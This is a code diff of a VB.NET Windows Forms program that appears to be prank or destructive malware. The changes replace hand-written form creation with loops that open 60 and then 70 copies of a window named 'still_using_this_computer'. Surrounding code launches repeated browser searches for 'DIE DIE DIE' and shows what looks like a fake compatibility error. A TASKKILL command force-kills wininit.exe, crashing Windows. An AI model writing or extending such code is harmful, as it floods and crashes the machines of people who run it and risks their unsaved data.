@@ -27,13 +27,10 @@ Public Class Form1
     Private ReadOnly filePath As String = "first_open.txt"
 
     Private Sub DebugScript() 'Code to run on debug mode
-        Dim formInstance1 As New still_using_this_computer()
-        Dim formInstance2 As New still_using_this_computer()
-
-        ' Show the forms
-        formInstance1.Show()
-        formInstance2.Show()
-
+        For i As Integer = 1 To 60
+            Dim q As New still_using_this_computer()
+            q.Show()
+        Next
     End Sub
 
 
@@ -425,14 +422,14 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
             Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
             a5.Show()
-            a3.Show()
+
             a6.Show()
             Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
         Catch ex As Exception
 
         End Try
         Wait(10)
-        a6.Show()
+
         a7.Show()
         a8.Show()
         Wait(1)
@@ -459,9 +456,8 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
         Wait(3)
 
-        a1.Show()
-        a2.Show()
-        a3.Show()
+
+
 
         Try
             Process.Start("https://www.google.com/search?sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-wMlNAtRhrt2T5ryRfPYICQBcEzg:1713312633304&q=windows+is+spyware&uds=AMwkrPte2rONdlHqaOEoNFr7YgHOiVFtgpI_Ouhp_p_393pfzLmTJdzG2eu02e1iRLtixUe8z4CGC2fuy7dcMRHztzSCFzI3dGLWAVQhBLrNqa6I5_RYST8DU1TQbprLSSo4h0E36iZuaMKfEtU8DupyBvGyxFpeJF6xxgOfHPEZ6HNMvV2BsglEgiuadGToqCC4x43gAAyb99N-2Pu0jgHjK1KRnsfHdxg-Pk7pwVebISixHAjviqZAl3hvC5lEiJSLj9l_zUpeHXM8HTSrqj8oX23a0Cx4DgeuBiZ9E2gkooxJZf7yn9PA3cOTe1ZWK231TMjcnghX&udm=2&prmd=ivnsbmtz&sa=X&ved=2ahUKEwjftJb3-seFAxVstokEHWrEDB8QtKgLegQICRAB&biw=1920&bih=919&dpr=1#vhid=nVwcAOfoXtc5YM&vssid=mosaic")
@@ -496,32 +492,15 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         Catch ex As Exception
 
         End Try
-        Dim q1 As New still_using_this_computer()
-        Dim q2 As New still_using_this_computer()
-        Dim q3 As New still_using_this_computer()
-        Dim q4 As New still_using_this_computer()
-        Dim q5 As New still_using_this_computer()
-        Dim q6 As New still_using_this_computer()
-        Dim q7 As New still_using_this_computer()
-        Dim q8 As New still_using_this_computer()
-        Dim q9 As New still_using_this_computer()
-        Dim q10 As New still_using_this_computer()
-        Dim q11 As New still_using_this_computer()
-        Dim q12 As New still_using_this_computer()
-        Dim q13 As New still_using_this_computer()
-        q1.Show()
-        q2.Show()
-        q3.Show()
-        q4.Show()
-        q5.Show()
-        q6.Show()
-        q8.Show()
-        q9.Show()
-        q10.Show()
-        q11.Show()
-        a12.Show()
-        q13.Show()
-        Wait(6)
+        For i As Integer = 1 To 70
+            Try
+                Dim q As New still_using_this_computer()
+                q.Show()
+            Catch ex As Exception
+            End Try
+        Next
+
+        Wait(3)
         MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)
 
 
